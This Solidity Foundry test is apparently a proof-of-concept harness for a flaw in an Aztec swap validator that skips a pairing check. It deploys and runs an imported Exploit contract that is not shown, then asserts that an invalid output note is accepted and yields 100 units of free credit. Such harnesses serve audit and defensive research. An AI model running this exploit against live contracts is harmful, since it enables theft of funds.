// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "./16736-aztec-swap-validator-missing-pairing-check.sol";

contract PoC_16736 is Test {
    function test_invalid_output_note_is_credited_without_pairing() public {
        Exploit exploit = new Exploit();
        exploit.run();
        assertTrue(exploit.acceptedInvalidNote());
        assertEq(exploit.freeCredit(), 100);
    }
}
